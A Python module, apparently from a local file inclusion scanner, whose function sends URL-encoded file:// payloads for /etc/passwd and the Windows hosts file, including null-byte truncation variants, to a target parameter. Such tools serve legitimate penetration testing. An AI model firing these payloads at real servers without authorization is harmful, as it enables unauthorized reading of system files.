from src.utils.arguments import args
from src.httpreqs.request import prepareRequest
from src.httpreqs.request import REQUEST
from src.configs.config import *
from src.utils import colors

def test_file_trunc(url, post):
    if(args.verbose):
        print(colors.blue("[i]") + " Testing with file wrapper...")

    tests = []
    tests.append("file%3A%2F%2F%2Fetc%2Fpasswd")
    tests.append("file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts")

    tests.append("file%3A%2F%2F%2Fetc%2Fpasswd%2500")
    tests.append("file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts%2500")

    for i in range(len(tests)):
        u, reqHeaders, postTest = prepareRequest(args.param, tests[i], url, post)
        _,br = REQUEST(u, reqHeaders, postTest, proxies, "LFI", "FILE")
        if(not br): return
        if(i == 1 and args.quick): return